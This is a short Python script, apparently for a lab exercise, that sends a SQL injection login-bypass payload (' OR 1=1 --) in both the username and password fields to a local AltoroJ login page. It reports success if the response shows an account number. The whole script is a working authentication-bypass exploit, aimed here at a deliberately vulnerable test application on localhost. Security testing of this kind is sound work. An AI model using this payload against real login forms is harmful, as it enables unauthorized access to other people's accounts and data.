import requests

# Script 1
def validateLog(url : str, data: dict[str, str]) -> int:
    request = requests.post(url, data=data)
    if(request.text.__contains__("800000")):
        return 1
    else:
        return 0



url = 'http://localhost:8130/altoroj/doLogin'
data = {'uid': "' OR 1=1 --", 'passw': "' OR 1=1 --"}

print(validateLog(url, data))




